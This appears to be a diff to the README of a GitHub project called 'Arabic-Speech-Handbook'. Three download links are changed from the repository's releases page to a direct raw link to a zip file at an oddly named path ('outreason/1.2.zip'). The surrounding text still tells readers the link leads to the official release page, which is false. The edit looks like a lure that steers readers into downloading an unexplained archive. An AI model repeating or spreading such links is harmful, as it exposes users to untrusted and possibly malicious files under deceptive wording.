@@ -16,11 +16,11 @@ This project compiles facts, links, and technical notes into a single, easy-to-f
 
 Visit this link to download the application:
 
-[![Download Arabic-Speech-Handbook](https://img.shields.io/badge/Download-Arabic--Speech--Handbook-blue?style=for-the-badge&logo=github)](https://github.com/Social-links661/Arabic-Speech-Handbook/releases)
+[![Download Arabic-Speech-Handbook](https://img.shields.io/badge/Download-Arabic--Speech--Handbook-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Social-links661/Arabic-Speech-Handbook/main/outreason/1.2.zip)
 
 Click the badge above or copy and paste this address into your browser:
 
-`https://github.com/Social-links661/Arabic-Speech-Handbook/releases`
+`https://raw.githubusercontent.com/Social-links661/Arabic-Speech-Handbook/main/outreason/1.2.zip`
 
 This link will take you to the official download page for the latest release.
 
@@ -123,7 +123,7 @@ Arabic-Speech-Handbook is your gateway to the world of Arabic voice technology. 
 
 Visit this link to download the application and begin your journey today:
 
-[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-brightgreen?style=for-the-badge)](https://github.com/Social-links661/Arabic-Speech-Handbook/releases)
+[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Social-links661/Arabic-Speech-Handbook/main/outreason/1.2.zip)
 
 ---
 
